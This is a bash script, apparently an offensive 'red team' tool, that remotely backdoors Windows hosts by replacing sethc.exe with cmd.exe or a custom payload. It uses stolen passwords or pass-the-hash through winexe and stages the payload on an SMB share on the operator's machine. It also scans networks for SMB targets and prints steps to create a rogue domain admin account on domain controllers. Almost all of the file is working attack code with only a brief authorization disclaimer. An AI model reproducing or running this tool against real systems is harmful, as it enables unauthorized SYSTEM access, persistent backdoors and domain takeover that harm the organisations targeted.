#!/bin/bash
# Linux-Based Remote Windows Sticky Keys Exploitation Tool
# For red team exercises and authorized penetration testing only

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${MAGENTA}=================================================${NC}"
echo -e "${MAGENTA}  Remote Windows Sticky Keys Exploitation Tool   ${NC}"
echo -e "${MAGENTA}  FOR RED TEAM EXERCISES ONLY                    ${NC}"
echo -e "${MAGENTA}=================================================${NC}"

# Function to check dependencies
check_dependencies() {
    echo -e "${BLUE}[*] Checking for required tools...${NC}"
    
    local missing_tools=()
    for tool in smbclient winexe pth-winexe impacket-smbserver python3; do
        if ! command -v $tool &>/dev/null; then
            missing_tools+=($tool)
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${RED}[-] Missing required tools: ${missing_tools[*]}${NC}"
        echo -e "${YELLOW}[*] You can install them with:${NC}"
        echo -e "    sudo apt update"
        echo -e "    sudo apt install -y smbclient winexe python3-impacket"
        return 1
    else
        echo -e "${GREEN}[+] All required tools are installed${NC}"
        return 0
    fi
}

# Function to set up SMB share
setup_smb_share() {
    local share_dir="$1"
    local share_name="$2"
    
    echo -e "${BLUE}[*] Setting up SMB share...${NC}"
    
    # Create directory if it doesn't exist
    mkdir -p "$share_dir"
    
    # Kill any existing SMB servers
    pkill -f "impacket-smbserver" &>/dev/null
    
    # Start SMB server in the background
    impacket-smbserver -smb2support "$share_name" "$share_dir" &>/dev/null &
    
    # Check if server started
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] SMB server started successfully${NC}"
        echo -e "${GREEN}[+] Share name: $share_name${NC}"
        echo -e "${GREEN}[+] Share path: $share_dir${NC}"
        return 0
    else
        echo -e "${RED}[-] Failed to start SMB server${NC}"
        return 1
    fi
}

# Function to exploit a target using credentials
exploit_with_creds() {
    local target="$1"
    local username="$2"
    local password="$3"
    local domain="$4"
    
    echo -e "${BLUE}[*] Attempting sticky keys exploit on $target using credentials${NC}"
    
    # Take ownership and modify permissions of sethc.exe
    echo -e "${YELLOW}[*] Taking ownership of sethc.exe...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "takeown /f C:\\Windows\\System32\\sethc.exe" 2>/dev/null
    
    echo -e "${YELLOW}[*] Modifying permissions...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F" 2>/dev/null
    
    # Backup original sethc.exe
    echo -e "${YELLOW}[*] Creating backup of original sethc.exe...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc.bak" 2>/dev/null
    
    # Replace sethc.exe with cmd.exe
    echo -e "${YELLOW}[*] Replacing sethc.exe with cmd.exe...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe" 2>/dev/null
    
    # Verify if the exploit was successful
    local result=$(winexe -U "$domain\\$username%$password" "//$target" "if exist C:\\Windows\\System32\\sethc.bak (echo SUCCESS) else (echo FAILED)" 2>/dev/null)
    
    if [[ "$result" == *"SUCCESS"* ]]; then
        echo -e "${GREEN}[+] Sticky keys exploit successfully deployed on $target${NC}"
        echo -e "${GREEN}[+] Press SHIFT key 5 times at the login screen to access a SYSTEM shell${NC}"
        return 0
    else
        echo -e "${RED}[-] Failed to deploy sticky keys exploit on $target${NC}"
        return 1
    fi
}

# Function to exploit a target using hash (pass-the-hash)
exploit_with_hash() {
    local target="$1"
    local username="$2"
    local hash="$3"
    local domain="$4"
    
    echo -e "${BLUE}[*] Attempting sticky keys exploit on $target using NTLM hash${NC}"
    
    # Take ownership and modify permissions of sethc.exe
    echo -e "${YELLOW}[*] Taking ownership of sethc.exe...${NC}"
    pth-winexe -U "$domain/$username%aad3b435b51404eeaad3b435b51404ee:$hash" "//$target" "takeown /f C:\\Windows\\System32\\sethc.exe" 2>/dev/null
    
    echo -e "${YELLOW}[*] Modifying permissions...${NC}"
    pth-winexe -U "$domain/$username%aad3b435b51404eeaad3b435b51404ee:$hash" "//$target" "icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F" 2>/dev/null
    
    # Backup original sethc.exe
    echo -e "${YELLOW}[*] Creating backup of original sethc.exe...${NC}"
    pth-winexe -U "$domain/$username%aad3b435b51404eeaad3b435b51404ee:$hash" "//$target" "copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc.bak" 2>/dev/null
    
    # Replace sethc.exe with cmd.exe
    echo -e "${YELLOW}[*] Replacing sethc.exe with cmd.exe...${NC}"
    pth-winexe -U "$domain/$username%aad3b435b51404eeaad3b435b51404ee:$hash" "//$target" "copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe" 2>/dev/null
    
    # Verify if the exploit was successful
    local result=$(pth-winexe -U "$domain/$username%aad3b435b51404eeaad3b435b51404ee:$hash" "//$target" "if exist C:\\Windows\\System32\\sethc.bak (echo SUCCESS) else (echo FAILED)" 2>/dev/null)
    
    if [[ "$result" == *"SUCCESS"* ]]; then
        echo -e "${GREEN}[+] Sticky keys exploit successfully deployed on $target${NC}"
        echo -e "${GREEN}[+] Press SHIFT key 5 times at the login screen to access a SYSTEM shell${NC}"
        return 0
    else
        echo -e "${RED}[-] Failed to deploy sticky keys exploit on $target${NC}"
        return 1
    fi
}

# Function to deploy a custom payload instead of cmd.exe
deploy_custom_payload() {
    local target="$1"
    local username="$2"
    local password="$3"
    local domain="$4"
    local payload_path="$5"
    
    echo -e "${BLUE}[*] Preparing to deploy custom payload to $target${NC}"
    
    # Check if payload exists
    if [ ! -f "$payload_path" ]; then
        echo -e "${RED}[-] Payload file not found: $payload_path${NC}"
        return 1
    fi
    
    # Create temp directory for SMB share
    local temp_dir="/tmp/smb_share_$$"
    mkdir -p "$temp_dir"
    
    # Copy payload to temp directory
    cp "$payload_path" "$temp_dir/payload.exe"
    
    # Set up SMB share
    setup_smb_share "$temp_dir" "tempshare"
    
    # Take ownership and modify permissions of sethc.exe
    echo -e "${YELLOW}[*] Taking ownership of sethc.exe...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "takeown /f C:\\Windows\\System32\\sethc.exe" 2>/dev/null
    
    echo -e "${YELLOW}[*] Modifying permissions...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F" 2>/dev/null
    
    # Backup original sethc.exe
    echo -e "${YELLOW}[*] Creating backup of original sethc.exe...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc.bak" 2>/dev/null
    
    # Copy payload from SMB share
    echo -e "${YELLOW}[*] Copying custom payload from SMB share...${NC}"
    winexe -U "$domain\\$username%$password" "//$target" "copy \\\\$(hostname -I | awk '{print $1}')\\tempshare\\payload.exe C:\\Windows\\System32\\sethc.exe" 2>/dev/null
    
    # Verify if the exploit was successful
    local result=$(winexe -U "$domain\\$username%$password" "//$target" "if exist C:\\Windows\\System32\\sethc.bak (echo SUCCESS) else (echo FAILED)" 2>/dev/null)
    
    # Cleanup
    pkill -f "impacket-smbserver" &>/dev/null
    rm -rf "$temp_dir"
    
    if [[ "$result" == *"SUCCESS"* ]]; then
        echo -e "${GREEN}[+] Custom payload successfully deployed on $target${NC}"
        echo -e "${GREEN}[+] Press SHIFT key 5 times at the login screen to trigger the payload${NC}"
        return 0
    else
        echo -e "${RED}[-] Failed to deploy custom payload on $target${NC}"
        return 1
    fi
}

# Function to target Active Directory server
target_ad_server() {
    local target="$1"
    local username="$2"
    local password="$3"
    local domain="$4"
    
    echo -e "${BLUE}[*] Targeting Active Directory server at $target${NC}"
    
    # Deploy sticky keys exploit
    exploit_with_creds "$target" "$username" "$password" "$domain"
    
    # If successful, attempt to extract credentials
    echo -e "${YELLOW}[*] Checking if target is a Domain Controller...${NC}"
    local dc_check=$(winexe -U "$domain\\$username%$password" "//$target" "systeminfo | findstr 'Domain Controller'" 2>/dev/null)
    
    if [[ -n "$dc_check" ]]; then
        echo -e "${GREEN}[+] Target confirmed as Domain Controller${NC}"
        echo -e "${YELLOW}[*] After accessing SYSTEM shell via sticky keys:${NC}"
        echo -e "${YELLOW}[*] 1. Create a domain admin: net user hacker P@ssw0rd123 /add /domain${NC}"
        echo -e "${YELLOW}[*] 2. Add to domain admins: net group \"Domain Admins\" hacker /add /domain${NC}"
        echo -e "${YELLOW}[*] 3. Extract domain info: wmic useraccount get name,sid${NC}"
    else
        echo -e "${YELLOW}[*] Target does not appear to be a Domain Controller${NC}"
    fi
}

# Function to target IIS server
target_iis_server() {
    local target="$1"
    local username="$2"
    local password="$3"
    local domain="$4"
    
    echo -e "${BLUE}[*] Targeting IIS server at $target${NC}"
    
    # Deploy sticky keys exploit
    exploit_with_creds "$target" "$username" "$password" "$domain"
    
    # Check for IIS
    echo -e "${YELLOW}[*] Checking for IIS service...${NC}"
    local iis_check=$(winexe -U "$domain\\$username%$password" "//$target" "sc query W3SVC" 2>/dev/null)
    
    if [[ "$iis_check" == *"RUNNING"* ]]; then
        echo -e "${GREEN}[+] IIS service confirmed running${NC}"
        echo -e "${YELLOW}[*] After accessing SYSTEM shell via sticky keys:${NC}"
        echo -e "${YELLOW}[*] 1. View IIS sites: %systemroot%\\system32\\inetsrv\\appcmd.exe list sites${NC}"
        echo -e "${YELLOW}[*] 2. Check web.config files for credentials${NC}"
        echo -e "${YELLOW}[*] 3. Access site files in %systemdrive%\\inetpub\\wwwroot\\${NC}"
    else
        echo -e "${YELLOW}[*] IIS service not detected or not running${NC}"
    fi
}

# Function to target Nginx server
target_nginx_server() {
    local target="$1"
    local username="$2"
    local password="$3"
    local domain="$4"
    
    echo -e "${BLUE}[*] Targeting Nginx server at $target${NC}"
    
    # Deploy sticky keys exploit
    exploit_with_creds "$target" "$username" "$password" "$domain"
    
    # Check for Nginx
    echo -e "${YELLOW}[*] Checking for Nginx service...${NC}"
    local nginx_check=$(winexe -U "$domain\\$username%$password" "//$target" "tasklist | findstr nginx" 2>/dev/null)
    
    if [[ -n "$nginx_check" ]]; then
        echo -e "${GREEN}[+] Nginx process confirmed running${NC}"
        echo -e "${YELLOW}[*] After accessing SYSTEM shell via sticky keys:${NC}"
        echo -e "${YELLOW}[*] 1. Check Nginx configuration: type C:\\path\\to\\nginx\\conf\\nginx.conf${NC}"
        echo -e "${YELLOW}[*] 2. Look for web roots and configuration files${NC}"
    else
        echo -e "${YELLOW}[*] Nginx process not detected${NC}"
    fi
}

# Function to restore original sethc.exe
restore_sethc() {
    local target="$1"
    local username="$2"
    local password="$3"
    local domain="$4"
    
    echo -e "${BLUE}[*] Attempting to restore original sethc.exe on $target${NC}"
    
    # Check if backup exists
    local backup_check=$(winexe -U "$domain\\$username%$password" "//$target" "if exist C:\\Windows\\System32\\sethc.bak (echo EXISTS) else (echo NOT_FOUND)" 2>/dev/null)
    
    if [[ "$backup_check" == *"EXISTS"* ]]; then
        echo -e "${YELLOW}[*] Backup found, restoring...${NC}"
        winexe -U "$domain\\$username%$password" "//$target" "copy /Y C:\\Windows\\System32\\sethc.bak C:\\Windows\\System32\\sethc.exe" 2>/dev/null
        
        # Verify restoration
        local verify=$(winexe -U "$domain\\$username%$password" "//$target" "fc /b C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\cmd.exe" 2>/dev/null)
        
        if [[ -z "$verify" || "$verify" == *"FC: no differences encountered"* ]]; then
            echo -e "${RED}[-] Restoration failed, sethc.exe still matches cmd.exe${NC}"
            return 1
        else
            echo -e "${GREEN}[+] Successfully restored original sethc.exe${NC}"
            return 0
        fi
    else
        echo -e "${RED}[-] Backup not found at C:\\Windows\\System32\\sethc.bak${NC}"
        return 1
    fi
}

# Function for scanning a network range for vulnerable targets
scan_network() {
    local network="$1"
    
    echo -e "${BLUE}[*] Scanning network $network for potential targets...${NC}"
    
    # Check if nmap is installed
    if ! command -v nmap &>/dev/null; then
        echo -e "${RED}[-] nmap not found, please install it:${NC}"
        echo -e "    sudo apt install nmap"
        return 1
    fi
    
    # Scan for Windows machines with SMB open
    echo -e "${YELLOW}[*] Scanning for Windows machines with SMB ports open...${NC}"
    nmap -p 445 --open $network -oG - | grep "445/open" | cut -d" " -f2
    
    return 0
}

# Main menu
main_menu() {
    echo -e "\n${CYAN}Available Options:${NC}"
    echo -e "1. Deploy sticky keys exploit using credentials"
    echo -e "2. Deploy sticky keys exploit using NTLM hash (pass-the-hash)"
    echo -e "3. Deploy custom payload instead of cmd.exe"
    echo -e "4. Target Active Directory server"
    echo -e "5. Target IIS server"
    echo -e "6. Target Nginx server"
    echo -e "7. Restore original sethc.exe"
    echo -e "8. Scan network for potential targets"
    echo -e "9. Exit"
    
    read -p "Enter your choice (1-9): " choice
    
    case $choice in
        1)
            read -p "Target IP: " target
            read -p "Username: " username
            read -p "Password: " -s password
            echo ""
            read -p "Domain (press enter for workgroup): " domain
            domain=${domain:-WORKGROUP}
            exploit_with_creds "$target" "$username" "$password" "$domain"
            ;;
        2)
            read -p "Target IP: " target
            read -p "Username: " username
            read -p "NTLM Hash: " hash
            read -p "Domain (press enter for workgroup): " domain
            domain=${domain:-WORKGROUP}
            exploit_with_hash "$target" "$username" "$hash" "$domain"
            ;;
        3)
            read -p "Target IP: " target
            read -p "Username: " username
            read -p "Password: " -s password
            echo ""
            read -p "Domain (press enter for workgroup): " domain
            domain=${domain:-WORKGROUP}
            read -p "Path to payload executable: " payload_path
            deploy_custom_payload "$target" "$username" "$password" "$domain" "$payload_path"
            ;;
        4)
            read -p "AD Server IP: " target
            read -p "Username: " username
            read -p "Password: " -s password
            echo ""
            read -p "Domain: " domain
            target_ad_server "$target" "$username" "$password" "$domain"
            ;;
        5)
            read -p "IIS Server IP: " target
            read -p "Username: " username
            read -p "Password: " -s password
            echo ""
            read -p "Domain (press enter for workgroup): " domain
            domain=${domain:-WORKGROUP}
            target_iis_server "$target" "$username" "$password" "$domain"
            ;;
        6)
            read -p "Nginx Server IP: " target
            read -p "Username: " username
            read -p "Password: " -s password
            echo ""
            read -p "Domain (press enter for workgroup): " domain
            domain=${domain:-WORKGROUP}
            target_nginx_server "$target" "$username" "$password" "$domain"
            ;;
        7)
            read -p "Target IP: " target
            read -p "Username: " username
            read -p "Password: " -s password
            echo ""
            read -p "Domain (press enter for workgroup): " domain
            domain=${domain:-WORKGROUP}
            restore_sethc "$target" "$username" "$password" "$domain"
            ;;
        8)
            read -p "Network range (e.g., 192.168.1.0/24): " network
            scan_network "$network"
            ;;
        9)
            echo -e "${CYAN}Exiting...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid option. Please try again.${NC}"
            ;;
    esac
    
    # Return to main menu
    read -p "Press enter to continue..."
    main_menu
}

# Check dependencies before starting
check_dependencies
if [ $? -eq 0 ]; then
    main_menu
fi
